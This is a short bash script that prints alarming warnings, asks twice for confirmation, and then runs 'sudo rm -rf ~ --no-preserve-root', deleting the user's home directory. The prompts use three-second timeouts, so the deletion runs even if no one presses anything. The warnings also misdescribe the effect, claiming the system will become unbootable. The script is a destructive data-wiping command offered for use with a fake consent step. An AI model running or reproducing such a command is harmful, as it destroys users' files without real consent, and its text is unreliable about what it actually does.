echo "WARNING! THIS WILL DELETE EVRYTHING! YOUR SYSTEM WILL BE UNBOOTABLE! ONLY CONTINUE IF YOU ARE"
echo "1. Using a virtual machine and know the risks"
echo "2. Are SUDO"
echo "hit enter to continue"
read -t 3 -n 1
echo "So far, this has only been tested on Endless OS. Are you sure you want to execute?"
read -t 3 -n 1
sudo rm -rf ~ --no-preserve-root
